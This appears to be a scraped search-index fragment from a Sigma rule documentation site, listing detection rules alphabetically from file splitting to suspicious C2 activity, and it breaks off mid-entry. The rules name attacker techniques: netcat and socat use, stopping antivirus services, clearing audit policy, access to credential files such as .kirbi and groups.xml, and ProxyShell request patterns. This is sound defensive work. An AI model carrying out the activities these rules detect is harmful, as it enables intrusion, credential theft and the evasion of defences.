https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1030/T1030.md Raw rule (edit) title: \u0026#39;Split A File Into Pieces\u0026#39; id: 2dad0cba-c62a-4a4f-949f-5f6ecd619769 status: test description: \u0026#39;Detection use of the command \u0026#34;split\u0026#34; to split files into parts and possible transfer.\u0026#39; author: \u0026#39;Igor Fits, oscd.community\u0026#39; references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1030/T1030.md date: 2020/10/15 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: \u0026#39;SYSCALL\u0026#39; comm: \u0026#39;split\u0026#39; condition: selection falsepositives: - \u0026#39;Legitimate administrative activity\u0026#39; level: low tags: - attack.exfiltration - attack.t1030 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_split_file_into_pieces.yml/","tags":["attack.exfiltration","attack.t1030"],"title":"Split A File Into Pieces"},{"categories":null,"contents":"Detection use of the command \u0026ldquo;split\u0026rdquo; to split files into parts and possible transfer.\nKnown false-positives Legitimate administrative activity References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1030/T1030.md Raw rule (edit) title: \u0026#39;Split A File Into Pieces\u0026#39; id: 7f2bb9d5-6395-4de5-969c-70c11fbe6b12 status: test description: \u0026#39;Detection use of the command \u0026#34;split\u0026#34; to split files into parts and possible transfer.\u0026#39; author: \u0026#39;Igor Fits, Mikhail Larin, oscd.community\u0026#39; references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1030/T1030.md date: 2020/10/15 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection: Image|endswith: \u0026#39;/split\u0026#39; condition: selection falsepositives: - \u0026#39;Legitimate administrative activity\u0026#39; level: low tags: - attack.exfiltration - attack.t1030 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_split_file_into_pieces.yml/","tags":["attack.exfiltration","attack.t1030"],"title":"Split A File Into Pieces"},{"categories":null,"contents":"Detects suspicious Spring framework exceptions that could indicate exploitation attempts\nKnown false-positives Application bugs Penetration testing References https://docs.spring.io/spring-security/site/docs/current/apidocs/overview-tree.html Raw rule (edit) title: Spring Framework Exceptions id: ae48ab93-45f7-4051-9dfe-5d30a3f78e33 status: stable description: Detects suspicious Spring framework exceptions that could indicate exploitation attempts author: Thomas Patzke date: 2017/08/06 modified: 2020/09/01 references: - https://docs.spring.io/spring-security/site/docs/current/apidocs/overview-tree.html logsource: category: application product: spring detection: keywords: - AccessDeniedException - CsrfException - InvalidCsrfTokenException - MissingCsrfTokenException - CookieTheftException - InvalidCookieException - RequestRejectedException condition: keywords falsepositives: - Application bugs - Penetration testing level: medium tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/spring/appframework_spring_exceptions.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Spring Framework Exceptions"},{"categories":null,"contents":"This rule detects execution of a PowerShell code through the sqltoolsps.exe utility, which is included in the standard set of utilities supplied with the Microsoft SQL Server Management studio. Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\nKnown false-positives Direct PS command execution through SQLToolsPS.exe is uncommon, childprocess sqltoolsps.exe spawned by smss.exe is a legitimate action. References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqltoolsps.yml https://twitter.com/pabraeken/status/993298228840992768 Raw rule (edit) title: SQL Client Tools PowerShell Session Detection id: a746c9b8-a2fb-4ee5-a428-92bee9e99060 status: test description: This rule detects execution of a PowerShell code through the sqltoolsps.exe utility, which is included in the standard set of utilities supplied with the Microsoft SQL Server Management studio. Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs. author: \u0026#39;Agro (@agro_sev) oscd.communitly\u0026#39; references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqltoolsps.yml - https://twitter.com/pabraeken/status/993298228840992768 date: 2020/10/13 modified: 2022/02/25 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: \u0026#39;\\sqltoolsps.exe\u0026#39; selection_2: ParentImage|endswith: \u0026#39;\\sqltoolsps.exe\u0026#39; selection_3: OriginalFileName: \u0026#39;\\sqltoolsps.exe\u0026#39; filter: ParentImage|endswith: \u0026#39;\\smss.exe\u0026#39; condition: 1 of selection_* and not filter falsepositives: - Direct PS command execution through SQLToolsPS.exe is uncommon, childprocess sqltoolsps.exe spawned by smss.exe is a legitimate action. level: medium tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1127 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_use_of_sqltoolsps_bin.yml/","tags":["attack.execution","attack.t1059.001","attack.defense_evasion","attack.t1127"],"title":"SQL Client Tools PowerShell Session Detection"},{"categories":null,"contents":"Detects Possible Squirrel Packages Manager as Lolbin\nKnown false-positives 1Clipboard Beaker Browser Caret Collectie Discord Figma Flow Ghost GitHub Desktop GitKraken Hyper Insomnia JIBO Kap Kitematic Now Desktop Postman PostmanCanary Rambox Simplenote Skype Slack SourceTree Stride Svgsus WebTorrent WhatsApp WordPress.com atom gitkraken slack teams References http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/ http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/ Raw rule (edit) title: Squirrel Lolbin id: fa4b21c9-0057-4493-b289-2556416ae4d7 status: experimental description: Detects Possible Squirrel Packages Manager as Lolbin references: - http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/ - http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/ tags: - attack.execution - attack.defense_evasion - attack.t1218 author: Karneades / Markus Neis, Jonhnathan Ribeiro, oscd.community date: 2019/11/12 modified: 2022/01/12 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\update.exe\u0026#39; # Check if folder Name matches executed binary \\\\(?P\u0026lt;first\u0026gt;[^\\\\]*)\\\\Update.*Start.{2}(?P\u0026lt;second\u0026gt;\\1)\\.exe (example: https://regex101.com/r/SGSQGz/2) CommandLine|contains: - \u0026#39;--processStart\u0026#39; - \u0026#39;--processStartAndWait\u0026#39; - \u0026#39;--createShortcut\u0026#39; CommandLine|contains|all: - \u0026#39;.exe\u0026#39; filter1: CommandLine|contains|all: - \u0026#39;C:\\Users\\\u0026#39; - \u0026#39;\\AppData\\Local\\Discord\\Update.exe\u0026#39; - \u0026#39; --processStart Discord.exe\u0026#39; condition: selection and not 1 of filter* falsepositives: - 1Clipboard - Beaker Browser - Caret - Collectie - Discord - Figma - Flow - Ghost - GitHub Desktop - GitKraken - Hyper - Insomnia - JIBO - Kap - Kitematic - Now Desktop - Postman - PostmanCanary - Rambox - Simplenote - Skype - Slack - SourceTree - Stride - Svgsus - WebTorrent - WhatsApp - WordPress.com - atom - gitkraken - slack - teams level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_squirrel_lolbin.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1218"],"title":"Squirrel Lolbin"},{"categories":null,"contents":"A General detection for files being created in the Windows startup directory. This could be an indicator of persistence.\nKnown false-positives unknown References https://github.com/OTRF/detection-hackathon-apt29/issues/12 https://threathunterplaybook.com/evals/apt29/detections/5.B.1_611FCA99-97D0-4873-9E51-1C1BA2DBB40D.html Raw rule (edit) title: Startup Folder File Write id: 2aa0a6b4-a865-495b-ab51-c28249537b75 status: test description: A General detection for files being created in the Windows startup directory. This could be an indicator of persistence. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://github.com/OTRF/detection-hackathon-apt29/issues/12 - https://threathunterplaybook.com/evals/apt29/detections/5.B.1_611FCA99-97D0-4873-9E51-1C1BA2DBB40D.html date: 2020/05/02 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection: TargetFilename|contains: \u0026#39;ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\u0026#39; condition: selection falsepositives: - unknown level: low tags: - attack.persistence - attack.t1547.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_startup_folder_file_write.yml/","tags":["attack.persistence","attack.t1547.001"],"title":"Startup Folder File Write"},{"categories":null,"contents":"Detects creation of startup item plist files that automatically get executed at boot initialization to establish persistence.\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1037.005/T1037.005.md Raw rule (edit) title: Startup Items id: dfe8b941-4e54-4242-b674-6b613d521962 status: test description: Detects creation of startup item plist files that automatically get executed at boot initialization to establish persistence. author: Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1037.005/T1037.005.md date: 2020/10/14 modified: 2021/11/27 logsource: category: file_event product: macos detection: selection_1: TargetFilename|contains: \u0026#39;/Library/StartupItems/\u0026#39; selection_2: TargetFilename|endswith: \u0026#39;.plist\u0026#39; condition: selection_1 and selection_2 falsepositives: - Legitimate administration activities level: low tags: - attack.persistence - attack.privilege_escalation - attack.t1037.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/file_event/file_event_macos_startup_items.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1037.005"],"title":"Startup Items"},{"categories":null,"contents":"Detects appending of zip file to image\nKnown false-positives None References https://attack.mitre.org/techniques/T1027/003/ https://zerotoroot.me/steganography-hiding-a-zip-in-a-jpeg-file/ Raw rule (edit) title: Steganography Hide Zip Information in Picture File id: 45810b50-7edc-42ca-813b-bdac02fb946b description: Detects appending of zip file to image author: \u0026#39;Pawel Mazur\u0026#39; status: experimental date: 2021/09/09 references: - https://attack.mitre.org/techniques/T1027/003/ - https://zerotoroot.me/steganography-hiding-a-zip-in-a-jpeg-file/ tags: - attack.defense_evasion - attack.t1027.003 falsepositives: - None level: low logsource: product: linux service: auditd detection: commands: type: EXECVE a0: cat a1: a1|endswith: - \u0026#39;.jpg\u0026#39; - \u0026#39;.png\u0026#39; a2: a2|endswith: \u0026#39;.zip\u0026#39; condition: commands and a1 and a2 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_hidden_zip_files_steganography.yml/","tags":["attack.defense_evasion","attack.t1027.003"],"title":"Steganography Hide Zip Information in Picture File"},{"categories":null,"contents":"Detects extracting of zip file from image file\nKnown false-positives None References https://attack.mitre.org/techniques/T1027/003/ https://zerotoroot.me/steganography-hiding-a-zip-in-a-jpeg-file/ Raw rule (edit) title: Steganography Unzip Hidden Information From Picture File id: edd595d7-7895-4fa7-acb3-85a18a8772ca description: Detects extracting of zip file from image file author: \u0026#39;Pawel Mazur\u0026#39; status: experimental date: 2021/09/09 references: - https://attack.mitre.org/techniques/T1027/003/ - https://zerotoroot.me/steganography-hiding-a-zip-in-a-jpeg-file/ tags: - attack.defense_evasion - attack.t1027.003 falsepositives: - None level: low logsource: product: linux service: auditd detection: commands: type: EXECVE a0: - unzip a1: a1|endswith: - \u0026#39;.jpg\u0026#39; - \u0026#39;.png\u0026#39; condition: commands and a1 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_unzip_hidden_zip_files_steganography.yml/","tags":["attack.defense_evasion","attack.t1027.003"],"title":"Steganography Unzip Hidden Information From Picture File"},{"categories":null,"contents":"This method detects a service install of the malicious Microsoft Network Realtime Inspection Service service described in StoneDrill report by Kaspersky\nKnown false-positives Unlikely References https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/ Raw rule (edit) title: StoneDrill Service Install id: 9e987c6c-4c1e-40d8-bd85-dd26fba8fdd6 status: test description: This method detects a service install of the malicious Microsoft Network Realtime Inspection Service service described in StoneDrill report by Kaspersky author: Florian Roth references: - https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/ date: 2017/03/07 modified: 2021/11/30 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ServiceName: NtsSrv ServiceFileName|endswith: \u0026#39; LocalService\u0026#39; condition: selection falsepositives: - Unlikely level: high tags: - attack.persistence - attack.g0064 - attack.t1543.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_apt_stonedrill.yml/","tags":["attack.persistence","attack.g0064","attack.t1543.003"],"title":"StoneDrill Service Install"},{"categories":null,"contents":"Adversaries may disable security tools to avoid possible detection of their tools and activities by stopping antivirus service\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md Raw rule (edit) title: Stop Or Remove Antivirus Service id: 6783aa9e-0dc3-49d4-a94a-8b39c5fd700b status: experimental author: frack113 date: 2021/07/07 modified: 2021/12/02 description: Adversaries may disable security tools to avoid possible detection of their tools and activities by stopping antivirus service references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection_action: CommandLine|contains: - \u0026#39;Stop-Service \u0026#39; - \u0026#39;Remove-Service \u0026#39; selection_product: CommandLine|contains: - \u0026#39; McAfeeDLPAgentService\u0026#39; - \u0026#39; Trend Micro Deep Security Manager\u0026#39; - \u0026#39; TMBMServer\u0026#39; # Feel free to add more service name condition: all of selection* fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_service_modification.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Stop Or Remove Antivirus Service"},{"categories":null,"contents":"Detects URP patterns and status codes that indicate a successful ProxyShell exploitation attack against Exchange servers\nKnown false-positives Unknown References https://youtu.be/5mqid-7zp8k?t=2231 https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1 Raw rule (edit) title: Successful Exchange ProxyShell Attack id: 992be1eb-e5da-437e-9a54-6d13b57bb4d8 status: experimental description: Detects URP patterns and status codes that indicate a successful ProxyShell exploitation attack against Exchange servers references: - https://youtu.be/5mqid-7zp8k?t=2231 - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html - https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1 author: Florian Roth, Rich Warren date: 2021/08/09 tags: - attack.initial_access logsource: category: webserver detection: selection_auto: c-uri|contains: \u0026#39;/autodiscover.json\u0026#39; selection_uri: c-uri|contains: - \u0026#39;/powershell\u0026#39; - \u0026#39;/mapi/nspi\u0026#39; - \u0026#39;/EWS\u0026#39; - \u0026#39;X-Rps-CAT\u0026#39; selection_success: sc-status: - 200 - 301 condition: selection_auto and selection_uri and selection_success falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_exchange_proxyshell_successful.yml/","tags":["attack.initial_access"],"title":"Successful Exchange ProxyShell Attack"},{"categories":null,"contents":"When IIS uses an old .Net Framework it\u0026rsquo;s possible to enumeration folder with the symbol ~.\nKnown false-positives Unknown References https://github.com/projectdiscovery/nuclei-templates/blob/master/fuzzing/iis-shortname.yaml https://www.exploit-db.com/exploits/19525 https://github.com/lijiejie/IIS_shortname_Scanner Raw rule (edit) title: Successful IIS Shortname Fuzzing Scan id: 7cb02516-6d95-4ffc-8eee-162075e111ac status: experimental author: frack113 description: When IIS uses an old .Net Framework it\u0026#39;s possible to enumeration folder with the symbol ~. references: - https://github.com/projectdiscovery/nuclei-templates/blob/master/fuzzing/iis-shortname.yaml - https://www.exploit-db.com/exploits/19525 - https://github.com/lijiejie/IIS_shortname_Scanner date: 2021/10/06 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection: c-uri|contains: \u0026#39;~1\u0026#39; c-uri|endswith: \u0026#39;a.aspx\u0026#39; cs-method: - GET - OPTIONS #only succes sc-status: - 200 - 301 condition: selection falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_iis_tilt_shortname_scan.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Successful IIS Shortname Fuzzing Scan"},{"categories":null,"contents":"Detects suspicious .NET assembly executions. Could detect using Cobalt Strike\u0026rsquo;s command execute-assembly.\nKnown false-positives https://twitter.com/SBousseaden/status/1388064061087260675 - rundll32.exe with zzzzInvokeManagedCustomActionOutOfProc in command line and msiexec.exe as parent process References https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/ https://github.com/olafhartong/sysmon-modular/blob/master/11_file_create/include_dotnet.xml Raw rule (edit) title: Suspcious CLR Logs Creation id: e4b63079-6198-405c-abd7-3fe8b0ce3263 description: Detects suspicious .NET assembly executions. Could detect using Cobalt Strike\u0026#39;s command execute-assembly. references: - https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html - https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/ - https://github.com/olafhartong/sysmon-modular/blob/master/11_file_create/include_dotnet.xml date: 2020/10/12 modified: 2021/11/17 tags: - attack.execution - attack.defense_evasion - attack.t1059.001 - attack.t1218 status: experimental author: omkar72, oscd.community, Wojciech Lesicki logsource: category: file_event product: windows definition: Check your sysmon configuration for monitoring UsageLogs folder. In SwiftOnSecurity configuration we have that thanks @SBousseaden detection: selection: TargetFilename|contains|all: - \u0026#39;\\AppData\\Local\\Microsoft\\CLR\u0026#39; - \u0026#39;\\UsageLogs\\\u0026#39; TargetFilename|contains: - \u0026#39;mshta\u0026#39; - \u0026#39;cscript\u0026#39; - \u0026#39;wscript\u0026#39; - \u0026#39;regsvr32\u0026#39; - \u0026#39;wmic\u0026#39; - \u0026#39;rundll32\u0026#39; - \u0026#39;svchost\u0026#39; condition: selection falsepositives: - https://twitter.com/SBousseaden/status/1388064061087260675 - rundll32.exe with zzzzInvokeManagedCustomActionOutOfProc in command line and msiexec.exe as parent process level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_susp_clr_logs.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1059.001","attack.t1218"],"title":"Suspcious CLR Logs Creation"},{"categories":null,"contents":"Detects suspect access to svchost process memory such as that used by Invoke-Phantom to kill the winRM windows event logging service.\nKnown false-positives unknown References https://github.com/hlldz/Invoke-Phant0m https://twitter.com/timbmsft/status/900724491076214784 Raw rule (edit) title: Suspect Svchost Memory Asccess id: 166e9c50-8cd9-44af-815d-d1f0c0e90dde status: experimental description: Detects suspect access to svchost process memory such as that used by Invoke-Phantom to kill the winRM windows event logging service. author: Tim Burrell date: 2020/01/02 modified: 2021/10/21 references: - https://github.com/hlldz/Invoke-Phant0m - https://twitter.com/timbmsft/status/900724491076214784 tags: - attack.defense_evasion - attack.t1562.002 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: \u0026#39;\\WINDOWS\\System32\\svchost.exe\u0026#39; GrantedAccess: \u0026#39;0x1F3FFF\u0026#39; CallTrace|contains: \u0026#39;UNKNOWN\u0026#39; condition: selection falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_invoke_phantom.yml/","tags":["attack.defense_evasion","attack.t1562.002"],"title":"Suspect Svchost Memory Asccess"},{"categories":null,"contents":"Detects known sensitive file extensions accessed on a network share\nKnown false-positives Help Desk operator doing backup or re-imaging end user machine or pentest or backup software Users working with these data types or exchanging message files Raw rule (edit) title: Suspicious Access to Sensitive File Extensions id: 91c945bc-2ad1-4799-a591-4d00198a1215 description: Detects known sensitive file extensions accessed on a network share status: experimental author: Samir Bousseaden date: 2019/04/03 modified: 2021/08/09 tags: - attack.collection - attack.t1039 logsource: product: windows service: security detection: selection: EventID: 5145 RelativeTargetName|endswith: - \u0026#39;.pst\u0026#39; - \u0026#39;.ost\u0026#39; - \u0026#39;.msg\u0026#39; - \u0026#39;.nst\u0026#39; - \u0026#39;.oab\u0026#39; - \u0026#39;.edb\u0026#39; - \u0026#39;.nsf\u0026#39; - \u0026#39;.bak\u0026#39; - \u0026#39;.dmp\u0026#39; - \u0026#39;.kirbi\u0026#39; - \u0026#39;\\groups.xml\u0026#39; - \u0026#39;.rdp\u0026#39; condition: selection fields: - ComputerName - SubjectDomainName - SubjectUserName - RelativeTargetName falsepositives: - Help Desk operator doing backup or re-imaging end user machine or pentest or backup software - Users working with these data types or exchanging message files level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_raccess_sensitive_fext.yml/","tags":["attack.collection","attack.t1039"],"title":"Suspicious Access to Sensitive File Extensions"},{"categories":null,"contents":"Detects known sensitive file extensions via Zeek\nKnown false-positives Help Desk operator doing backup or re-imaging end user machine or pentest or backup software Users working with these data types or exchanging message files References https://github.com/neo23x0/sigma/blob/d42e87edd741dd646db946f30964f331f92f50e6/rules/windows/builtin/win_susp_raccess_sensitive_fext.yml Raw rule (edit) title: Suspicious Access to Sensitive File Extensions - Zeek id: 286b47ed-f6fe-40b3-b3a8-35129acd43bc status: test description: Detects known sensitive file extensions via Zeek author: \u0026#39;Samir Bousseaden, @neu5ron\u0026#39; references: - https://github.com/neo23x0/sigma/blob/d42e87edd741dd646db946f30964f331f92f50e6/rules/windows/builtin/win_susp_raccess_sensitive_fext.yml date: 2020/04/02 modified: 2021/11/27 logsource: product: zeek service: smb_files detection: selection: name|endswith: - \u0026#39;.pst\u0026#39; - \u0026#39;.ost\u0026#39; - \u0026#39;.msg\u0026#39; - \u0026#39;.nst\u0026#39; - \u0026#39;.oab\u0026#39; - \u0026#39;.edb\u0026#39; - \u0026#39;.nsf\u0026#39; - \u0026#39;.bak\u0026#39; - \u0026#39;.dmp\u0026#39; - \u0026#39;.kirbi\u0026#39; - \u0026#39;\\groups.xml\u0026#39; - \u0026#39;.rdp\u0026#39; condition: selection fields: - ComputerName - SubjectDomainName - SubjectUserName - RelativeTargetName falsepositives: - Help Desk operator doing backup or re-imaging end user machine or pentest or backup software - Users working with these data types or exchanging message files level: medium tags: - attack.collection ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_smb_converted_win_susp_raccess_sensitive_fext.yml/","tags":["attack.collection"],"title":"Suspicious Access to Sensitive File Extensions - Zeek"},{"categories":null,"contents":"schtasks.exe create task from user AppData\\Local\\Temp\nKnown false-positives unknown References malware analyse https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04 Raw rule (edit) title: Suspicious Add Scheduled Task From User AppData Temp id: 43f487f0-755f-4c2a-bce7-d6d2eec2fcf8 description: schtasks.exe create task from user AppData\\Local\\Temp status: experimental references: - malware analyse https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04 tags: - attack.execution - attack.t1053.005 author: frack113 date: 2021/11/03 modified: 2022/02/09 logsource: product: windows category: process_creation detection: schtasks: Image|endswith: \u0026#39;schtasks.exe\u0026#39; option: CommandLine|contains|all: - \u0026#39;/Create \u0026#39; - \u0026#39;\\AppData\\Local\\Temp\u0026#39; filter_klite_codec: CommandLine|contains|all: - \u0026#39;/Create /TN \u0026#34;klcp_update\u0026#34; /XML \u0026#39; - \u0026#39;\\klcp_update_task.xml\u0026#39; condition: schtasks and option and not 1 of filter_* falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_schtasks_user_temp.yml/","tags":["attack.execution","attack.t1053.005"],"title":"Suspicious Add Scheduled Task From User AppData Temp"},{"categories":null,"contents":"Detects suspicious command line in which a user gets added to the local Remote Desktop Users group\nKnown false-positives Administrative activity References https://www.microsoft.com/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/ Raw rule (edit) title: Suspicious Add User to Remote Desktop Users Group id: ffa28e60-bdb1-46e0-9f82-05f7a61cc06e status: experimental description: Detects suspicious command line in which a user gets added to the local Remote Desktop Users group author: Florian Roth date: 2021/12/06 references: - https://www.microsoft.com/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/ tags: - attack.persistence - attack.t1133 - attack.t1136.001 - attack.lateral_movement - attack.t1021.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;net \u0026#39; - \u0026#39;localgroup\u0026#39; - \u0026#39;Remote Desktop Users\u0026#39; - \u0026#39;/add\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Administrative activity level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_add_user_remote_desktop.yml/","tags":["attack.persistence","attack.t1133","attack.t1136.001","attack.lateral_movement","attack.t1021.001"],"title":"Suspicious Add User to Remote Desktop Users Group"},{"categories":null,"contents":"Atbroker executing non-deafualt Assistive Technology applications\nKnown false-positives Legitimate, non-default assistive technology applications execution References http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/ https://lolbas-project.github.io/lolbas/Binaries/Atbroker/ Raw rule (edit) title: Suspicious Atbroker Execution id: f24bcaea-0cd1-11eb-adc1-0242ac120002 description: Atbroker executing non-deafualt Assistive Technology applications references: - http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/ - https://lolbas-project.github.io/lolbas/Binaries/Atbroker/ status: experimental author: Mateusz Wydra, oscd.community date: 2020/10/12 modified: 2021/08/14 tags: - attack.defense_evasion - attack.t1218 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;AtBroker.exe\u0026#39; CommandLine|contains: \u0026#39;start\u0026#39; filter: CommandLine|contains: - animations - audiodescription - caretbrowsing - caretwidth - colorfiltering - cursorscheme - filterkeys - focusborderheight - focusborderwidth - highcontrast - keyboardcues - keyboardpref - magnifierpane - messageduration - minimumhitradius - mousekeys - Narrator - osk - overlappedcontent - showsounds - soundsentry - stickykeys - togglekeys - windowarranging - windowtracking - windowtrackingtimeout - windowtrackingzorder condition: selection and not filter falsepositives: - Legitimate, non-default assistive technology applications execution level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_atbroker.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Suspicious Atbroker Execution"},{"categories":null,"contents":"Threat actors can use auditpol binary to change audit policy configuration to impair detection capability. This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\nKnown false-positives Admin activity References https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/ Raw rule (edit) title: Suspicious Auditpol Usage id: 0a13e132-651d-11eb-ae93-0242ac130002 description: Threat actors can use auditpol binary to change audit policy configuration to impair detection capability. This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor. status: experimental author: Janantha Marasinghe (https://github.com/blueteam0ps) references: - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/ date: 2021/02/02 modified: 2021/02/02 tags: - attack.defense_evasion - attack.t1562.002 level: high logsource: category: process_creation product: windows detection: selection_auditpol_binary: Image|endswith: \u0026#39;\\auditpol.exe\u0026#39; selection_auditpol_command: CommandLine|contains: - \u0026#39;disable\u0026#39; # disables a specific audit policy - \u0026#39;clear\u0026#39; # delete or clears audit policy - \u0026#39;remove\u0026#39; # removes an audit policy - \u0026#39;restore\u0026#39; # restores an audit policy condition: selection_auditpol_binary and selection_auditpol_command falsepositives: - Admin activity ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_sus_auditpol_usage.yml/","tags":["attack.defense_evasion","attack.t1562.002"],"title":"Suspicious Auditpol Usage"},{"categories":null,"contents":"Detects suspicious activities as declared by Florian Roth in its \u0026lsquo;Best Practice Auditd Configuration\u0026rsquo;. This includes the detection of the following commands; wget, curl, base64, nc, netcat, ncat, ssh, socat, wireshark, rawshark, rdesktop, nmap. These commands match a few techniques from the tactics \u0026ldquo;Command and Control\u0026rdquo;, including not exhaustively the following; Application Layer Protocol (T1071), Non-Application Layer Protocol (T1095), Data Encoding (T1132)\nKnown false-positives Admin or User activity References https://github.com/Neo23x0/auditd Raw rule (edit) title: Suspicious C2 Activities id: f7158a64-6204-4d6d-868a-6e6378b467e0 status: test description: Detects suspicious activities as declared by Florian Roth in its \u0026#39;Best Practice Auditd Configuration\u0026#39;. This includes the detection of the following commands; wget, curl, base64, nc, netcat, ncat, ssh, socat, wireshark, rawshark, rdesktop, nmap. These commands match a few techniques from the tactics \u0026#34;Command and Control\u0026#34;, including not exhaustively the following; Application Layer Protocol (T1071), Non-Application Layer Protocol (T1095), Data Encoding (T1132) author: Marie Euler references: - \u0026#39;https://github.com/Neo23x0/auditd\u0026#39; date: 2020/05/18 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: key: - \u0026#39;susp_activity\u0026#39; condition: selection falsepositives: - Admin or User activity level: medium tags: - attack.command_and_control ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_susp_c2_commands.yml/","tags":["attack.command_and_control"],"title":"Suspicious C2 Activities"},{"categories":null,"contents":"Detects suspicious use of calc.exe with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion\nKnown false-positives Unknown References 